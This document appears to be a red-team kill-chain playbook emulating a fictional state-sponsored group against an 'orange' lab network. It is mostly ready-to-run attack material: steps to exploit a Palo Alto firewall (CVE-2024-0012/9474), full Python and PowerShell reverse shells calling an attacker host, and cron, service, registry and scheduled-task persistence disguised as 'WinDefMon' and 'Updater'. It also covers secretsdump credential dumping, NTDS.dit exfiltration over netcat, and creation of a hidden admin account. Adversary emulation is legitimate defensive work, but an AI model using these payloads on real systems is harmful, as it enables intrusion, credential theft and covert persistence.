# Phase 0: Initial Setup for Kill Chain

Background: Sassy Panda is an Eastonian government affiliated cyber group falling under the Eastonian Cyber Agency (ECA) and comprised of Easton’s most sophisticated capabilities and equipment. Sassy Panda typically focuses on espionage and information gathering and has targeted critical infrastructure in the U.S. including the New England region. Having been active for over 15 years in the computer network exploitation game, the group has emphasized stealth in operations using web shells, living-off-the-land (LOTL) binaries, hands-on-keyboard activities, and stolen credentials.

TTPS:

Enterprise:

Account Discovery: Domain Account, Archive Collected Data: Archive via Utility, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Compromise Infrastructure: Server, Compromise Infrastructure: Botnet, Credentials from Password Stores, Data from Local System, Data Staged, Local Data Staging, Encrypted Channel: Symmetric Cryptography, Exploit Public-Facing Application, Indicator Removal: File Deletion, Indicator Removal: Clear Network Connection History and Configurations, Lateral Tool Transfer, Log Enumeration, Masquerading: Match Legitimate Name or Location, Masquerading: Masquerade File Type, Obtain Capabilities: Tool, OS Credential Dumping: LSASS Memory, OS Credential Dumping: NTDS, Permission Groups Discovery: Local Groups, Permission Groups Discovery: Domain Groups, Process Discovery, Proxy, Internal Proxy, Query Registry, Remote System Discovery, Server Software Component: Web Shell, Software Discovery, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, Valid Accounts: Domain Accounts, Virtualization/Sandbox Evasion: System Checks, Windows Management Instrumentation



Target: Palo Alto firewall management interface at XXX.XXX.XXX.XXX
 Exploit Used: PoC.py
 CVE: CVE-2024-0012 and CVE-2024-9474

Exploit Setup:

1. Create a new folder on your attack box as this will be used to stage all of the required files and scripts.
2. Open a text editor on the attack machine (preferably nano).
3. Copy and paste the PoC.py script into the text editor (best case of doing this is utilizing ClickPaste and keep the name the same)
4. If using nano, press ctrl+O and then enter to write out the file, then press ctrl+X to exit the program
5. chmod +x PoC.py
   

Persistence Script Setup:

1. Perform the following command: nano pan_os_comm.py
2. In nano, copy and paste the below script: ***NOTE- BE SURE TO CHANGE THE IP ADDRESS AND PORT IN THE "s.connect(("10.10.100.169", 63842))" LINE TO MATCH THE IP ADDRESS OF YOUR ATTACK MACHINE AND A RANDOM HIGH PORT OF YOUR CHOICE- end note :) ***

```
#!/usr/bin/env python3

import socket
import subprocess
import os
import pty

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("10.10.100.169", 63842))

os.dup2(s.fileno(), 0)

os.dup2(s.fileno(), 1)

os.dup2(s.fileno(), 2)

pty.spawn("sh")

```


# Phase 1: Initial Access via Palo Alto Exploit

Post-Exploitation:
● Upgrade shell if necessary.
● Identify internal routes/interfaces.
● Upload a simple proxy (e.g., socat or chisel) if needed for tunneling

# Phase 2: Internal Reconnaissance & Enumeration
Once inside the firewall OS:
### Identify internal interfaces and routes

```bash
ip addr
ip route
cat /etc/resolv.conf
```

# Look for management configs or logs

```bash
cat /config/config.xml | grep -i 'mgmt\|admin\|ldap\|radius'
```

## 🧨 Final Red Team Implant: `pan_os_comm.sh` with Stealthy Service

### 1. 🎯 Start the Listener on (ATTACKER)

```bash
nc -lvnp 63842
```

### 2. 📁 Create the Reverse Shell Script (ATTACKER)

```bash
sudo vim /tmp/pan_os_comm.py
```

`i`
```python
usr/bin/env python3 

import socket,subprocess,os;

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.100.169",63842));

os.dup2(s.fileno(),0); 

os.dup2(s.fileno(),1);

os.dup2(s.fileno(),2);

import pty; pty.spawn("sh")
```
`:wq!`

```bash
cd /tmp
wget http://10.10.100.169/pan_os_comm.py
```
### 4. Change perms of python file (VICTIM)
Make it executable:
```bash
chmod +x /tmp/pan_os_comm.py
```
### 5. Add Crontab every minute (VICTIM)

```bash
(crontab -l 2>/dev/null; echo '* * * * * /bin/systemctl start pan_os_comm.service >/dev/null 2>&1') | crontab -
```
---
# Attempt to pivot through firewall if routing/NAT is enabled
- sshuttle/reverse SOCKS proxy (chisel, socat) to tunnel traffic into the internal 
network.

# Phase 3: Target Discovery Inside Orange Space
Assuming pivot success to internal hosts:
#### Scan internal subnets for DC or LDAP
```bash
nmap -p 389,445,88,135,139,389,636,3268,3269 -sV -Pn 172.20.0.0/16
```

- Look for the Domain Controller (likely in orange-servers or orange-users).

# Phase 4: Credential Access (via LDAP, SAM/NTDS)
- Once a DC is identified (e.g., 172.20.2.X), you can:
	- 88, 389
- Enumerate via LDAP (LOLBAS):
```bash
ldapsearch -x -h 172.20.2.X -b "dc=orange,dc=local"
```
If admin rights are obtained, dump credentials:
1. Use secretsdump from Impacket
```bash
impacket-secretsdump 'orange.local/adminuser:password@172.20.2.X'
```
2. If on host with NTDS.dit access:
	Copy ntds.dit and SYSTEM hive for offline cracking
```bash
copy C:\Windows\NTDS\ntds.dit D:\stolen\
reg save hklm\system D:\stolen\system.hiv
```
Transfer those over SMB/certutil:
```bash
certutil -urlcache -f http://<attacker_ip>/nc.exe nc.exe
nc.exe <attacker_ip> 4444 < ntds.dit
nc.exe <attacker_ip> 4445 < system.hiv
```
Then parse locally:
```bash
secretsdump.py -ntds ntds.dit -system system.hiv LOCAL
```
# Phase 5: Lateral Movement and Persistence
Use Admin Shares:
```bash
wmic /node:172.20.0.X process call create "cmd.exe /c whoami"
psexec.py orange.local/adminuser@172.20.0.X
```
### Create a hidden user (LOLBAS):
```bash
net user stealthyUser P@ssw0rd! /add
net localgroup administrators stealthyUser /add
```
## Persist via Scheduled Task or Service:

```bash
schtasks /create /tn "Updater" /tr "powershell -NoP -NonI -W Hidden -Enc <payload>" /sc minute /mo 15
```
## 🔧 Step-by-Step: Install `WinDefMon` Reverse Shell Service on DC

### 1. 📜 **Reverse Shell Payload**

Save this script as `C:\ProgramData\winmon.ps1` on the **Domain Controller**:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",9999)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2  = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

---
### 2. 🔐 **Base64 Encode It**

```powershell
$payload = Get-Content -Raw C:\ProgramData\winmon.ps1
$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
$encoded = [Convert]::ToBase64String($bytes)
```

---
### 3. ⚙️ **Create the Service as WinDefMon**

```powershell
$cmd = "powershell.exe -NoP -W Hidden -Enc $encoded"
sc.exe create WinDefMon binPath= "$cmd" start= auto
sc.exe start WinDefMon
```

💡 *Use quotes properly after `binPath=` and ensure the encoded string doesn't break on multiple lines if scripting.*

---
### 4. 🧪 **Start Your Listener**

```bash
nc -lvnp 9999
```
---

Or use registry run keys:

```bash
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t 

REG_SZ /d "powershell.exe -WindowStyle Hidden -File C:\Users\Public\rev.ps1"
```

Phase 6: OT Network Target Prep (Later Stage)







# Teardown
## 🧼 Teardown (DC)

```powershell
sc stop WinDefMon
sc delete WinDefMon
Remove-Item C:\ProgramData\winmon.ps1 -Force
```
